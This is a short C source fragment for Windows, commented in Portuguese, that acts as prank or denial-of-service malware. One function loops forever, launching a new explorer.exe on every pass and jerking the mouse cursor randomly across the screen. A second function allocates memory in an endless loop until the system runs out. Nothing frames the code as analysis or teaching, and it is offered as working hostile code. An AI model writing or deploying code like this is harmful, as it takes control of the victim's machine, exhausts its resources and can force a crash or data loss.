void loucura() {
    while(1)
{
   srand((unsigned)time(0));

   int SCR_WIDTH  = GetSystemMetrics(SM_CXSCREEN) - 1;
   int SCR_HEIGHT = GetSystemMetrics(SM_CYSCREEN) - 1;

   int xspeed, yspeed;
   int x = SCR_WIDTH / 2, y = SCR_HEIGHT /2;

      system("start explorer.exe");

      xspeed = rnd(-100, 100);
      yspeed = rnd(-100, 100);

   for(int i = 0; i < 10; i++)
      {
         x += xspeed;
         y += yspeed;
         SetCursorPos(x, y);

         /* Verifique para bater ao lado da tela. */
         if(x >= SCR_WIDTH)
         {
            xspeed = -xspeed; // converter mais para menos ou de menos para mais.
         }
         else if(x <= 0)
         {
            xspeed = -xspeed;
         }
         else if(y >= SCR_HEIGHT)
         {
            yspeed = -yspeed;
         }
         else if(y <= 0)
         {
            yspeed = -yspeed;
         }

         Sleep(10);
    }
}

}

int rnd(int min, int max) {

      return rand() % (max - min) + min;

}

void encherMemoria(){
    for( ; ; )
        malloc(10000);
}
